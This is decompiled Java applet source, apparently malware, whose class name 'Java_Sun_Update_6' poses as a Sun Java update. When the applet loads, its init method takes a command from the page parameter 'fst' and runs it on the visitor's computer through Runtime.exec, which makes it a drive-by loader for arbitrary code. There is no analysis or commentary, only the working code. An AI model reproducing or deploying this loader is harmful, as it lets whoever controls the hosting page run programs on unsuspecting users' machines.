import java.io.IOException;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Java_Sun_Update_6 extends Applet
{
    public void init() {
        final String fst = this.getParameter("fst");
        try {
            final Process f = Runtime.getRuntime().exec(fst);
        }
        catch (IOException ex) {}
    }
}
